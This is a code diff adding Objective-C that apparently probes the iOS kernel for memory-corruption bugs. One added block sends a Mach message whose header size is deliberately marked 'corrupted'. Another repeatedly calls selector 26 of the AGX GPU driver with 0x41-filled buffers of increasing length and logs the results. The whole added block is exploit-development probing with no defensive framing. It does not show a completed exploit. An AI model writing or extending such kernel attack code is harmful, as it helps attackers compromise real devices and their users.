@@ -1423,6 +1423,51 @@ cleanup:
                                 scopeNote(r, [NSString stringWithFormat:@"  IOSurface base after=%p", base2]);
                                 IOSurfaceUnlock(surf, 0, NULL);
                                 CFRelease(surf);
+
+                                // ---- Approach 1: mach_msg OOB → kernel copy with corrupted size ----
+                                scopeNote(r, @"  --- Approach 1: mach_msg OOB → kernel copy ---");
+                                {
+                                    mach_port_t p1 = MACH_PORT_NULL;
+                                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p1);
+                                    mach_port_insert_right(mach_task_self(), p1, p1, MACH_MSG_TYPE_MAKE_SEND);
+                                    uint8_t buf1[256];
+                                    memset(buf1, 0x41, sizeof(buf1));
+                                    mach_msg_header_t *h1 = (mach_msg_header_t *)buf1;
+                                    h1->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                                    h1->msgh_size = 128;  // corrupted size
+                                    h1->msgh_remote_port = p1;
+                                    h1->msgh_id = 0x3001;
+                                    kern_return_t kr1 = mach_msg(h1, MACH_SEND_MSG | MACH_SEND_TIMEOUT, 128, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                                    scopeNote(r, [NSString stringWithFormat:@"  mach_msg send ret=%d", (int)kr1]);
+                                    if (kr1 == KERN_SUCCESS) {
+                                        uint8_t recv1[256];
+                                        memset(recv1, 0, sizeof(recv1));
+                                        mach_msg_header_t *rh1 = (mach_msg_header_t *)recv1;
+                                        kr1 = mach_msg(rh1, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 256, p1, 100, MACH_PORT_NULL);
+                                        scopeNote(r, [NSString stringWithFormat:@"  mach_msg recv ret=%d size=%u", (int)kr1, rh1->msgh_size]);
+                                    }
+                                    mach_port_destroy(mach_task_self(), p1);
+                                }
+
+                                // ---- Approach 2: IOConnectCallMethod with corrupted input_size ----
+                                scopeNote(r, @"  --- Approach 2: IOConnectCallMethod ---");
+                                {
+                                    extern kern_return_t agx_tc_open(io_connect_t *out_conn, int *out_path);
+                                    extern kern_return_t agx_tc_sel26(io_connect_t conn, const uint64_t scalars[4], const void *in, size_t in_len);
+                                    io_connect_t conn2 = 0;
+                                    int path2 = 0;
+                                    kern_return_t kr2 = agx_tc_open(&conn2, &path2);
+                                    scopeNote(r, [NSString stringWithFormat:@"  agx open: kr=%d conn=%u", (int)kr2, conn2]);
+                                    if (kr2 == KERN_SUCCESS && conn2) {
+                                        uint64_t sc[4] = {0,0,0,0};
+                                        uint8_t buf2[256];
+                                        memset(buf2, 0x41, sizeof(buf2));
+                                        for (size_t sz = 8; sz <= 128; sz *= 2) {
+                                            kr2 = agx_tc_sel26(conn2, sc, buf2, sz);
+                                            scopeNote(r, [NSString stringWithFormat:@"  sel26 in_len=%zu → kr=0x%x", sz, (int)kr2]);
+                                        }
+                                    }
+                                }
                             }
                         } @catch (NSException *e) {
                             scopeNote(r, [NSString stringWithFormat:@"  IOSurface exception: %@", e]);
